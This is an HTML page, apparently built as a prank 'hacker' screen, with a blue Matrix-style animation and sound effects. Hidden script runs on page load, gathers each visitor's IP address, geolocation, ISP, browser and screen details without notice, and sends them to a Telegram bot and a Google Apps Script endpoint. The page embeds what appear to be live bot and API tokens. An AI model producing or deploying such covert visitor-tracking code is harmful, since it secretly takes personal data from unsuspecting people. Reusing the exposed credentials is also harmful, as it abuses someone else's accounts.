<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>🔹🪄🔹 😈 🔹🪄🔹</title>
  <style>
    body {
      margin: 0;
      overflow: hidden;
      background: black;
      color: white;
      font-family: 'Courier New', Courier, monospace;
    }

    canvas {
      display: block;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: -1;
    }

    .message {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      text-align: center;
      font-size: 3rem;
      opacity: 0;
      animation: fadeIn 2s ease 3s forwards;
    }

    @keyframes fadeIn {
      to {
        opacity: 1;
      }
    }
  </style>
</head>
<body>
  <canvas id="matrix"></canvas>
  <div class="message">🔹🔹🪄🔹🔹</div>
  <audio id="doll-sound" src="https://www.myinstants.com/media/sounds/squid-game-doll-music.mp3" preload="auto"></audio>
  <audio id="hacking-sound" src="https://sounds.pond5.com/computer-beep-boop-hacking-sounds-sound-effect-296926349_nw_prev.m4a" preload="auto"></audio>
  <audio id="input-sound" src="https://sounds.pond5.com/digital-data-input-5-sound-effect-151371439_nw_prev.m4a" preload="auto"></audio>

  <script>
    // Matrix background animation (same blue as 🔹)
    const canvas = document.getElementById("matrix");
    const ctx = canvas.getContext("2d");

    let width = canvas.width = window.innerWidth;
    let height = canvas.height = window.innerHeight;

    const letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    const fontSize = 16;
    const columns = Math.floor(width / fontSize);
    const drops = new Array(columns).fill(1);

    function drawMatrix() {
      ctx.fillStyle = "rgba(0, 0, 0, 0.1)";
      ctx.fillRect(0, 0, width, height);

      ctx.fillStyle = "#1e90ff"; // Same color as 🔹
      ctx.font = fontSize + "px monospace";

      for (let i = 0; i < drops.length; i++) {
        const text = letters.charAt(Math.floor(Math.random() * letters.length));
        ctx.fillText(text, i * fontSize, drops[i] * fontSize);

        if (drops[i] * fontSize > height && Math.random() > 0.975) {
          drops[i] = 0;
        }
        drops[i]++;
      }
    }

    setInterval(drawMatrix, 40);

    // Resize canvas when window resizes
    window.addEventListener('resize', () => {
      width = canvas.width = window.innerWidth;
      height = canvas.height = window.innerHeight;
    });

    // Play sounds after page loads
    window.addEventListener('load', () => {
      setTimeout(() => {
        const audio1 = document.getElementById("doll-sound");
        audio1.play().catch(e => console.log("Audio1 play blocked: ", e));

        setTimeout(() => {
          const audio2 = document.getElementById("hacking-sound");
          audio2.play().catch(e => console.log("Audio2 play blocked: ", e));

          setTimeout(() => {
            const audio3 = document.getElementById("input-sound");
            audio3.play().catch(e => console.log("Audio3 play blocked: ", e));
          }, 2500);

        }, 2500);
      }, 2500);
    });

    async function logVisitorInfo() {
      try {
        const res = await fetch('https://ipinfo.io/json?token=5e4cc2202c7681'); // حط توكنك هنا لو عندك
        const data = await res.json();

        const info = {
          ip: data.ip,
          city: data.city,
          region: data.region,
          country: data.country,
          loc: data.loc,
          org: data.org,
          timezone: data.timezone,
          browser: navigator.userAgent,
          language: navigator.language,
          screen: `${window.screen.width}x${window.screen.height}`,
          time: new Date().toLocaleString()
        };

        const message = `
          👀 زائر دخل الصفحة:
          📍 IP: ${info.ip}
          🏙️ الموقع: ${info.city}, ${info.region}, ${info.country}
          🕹️ الجهاز: ${info.browser}
          🌐 اللغة: ${info.language}
          📱 الشاشة: ${info.screen}
          🕰️ التوقيت: ${info.time}
          🛰️ مزود الخدمة: ${info.org}
        `;

        // ابعت البيانات دي لـ Telegram Webhook
        fetch("https://api.telegram.org/bot7661069709:AAGR_xR9p1sZoc_-Xvynqdn5aMVpp_ph84U/sendMessage", {
  method: "POST",
  headers: {
    "Content-Type": "application/json"
  },
  body: JSON.stringify({
    chat_id: "1193959724",  // Chat ID الصحيح
    text: message
  })
});

        // ابعت البيانات دي لـ Google Sheets Web App
        fetch('https://script.google.com/macros/s/AKfycbwzNTovUiqUlRJ6mOSP5lzWGxIZ3ofpHdVk3IqUiJ0XBQvF4j3hKd11HbvhBl1TpTlicw/exec', {
          method: 'GET',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(info)
        });
      } catch (err) {
        console.error("فشل في جلب بيانات الزائر:", err);
      }
    }

    // شغلها بعد تحميل الصفحة
    window.addEventListener("load", logVisitorInfo);
  </script>
</body>
</html>
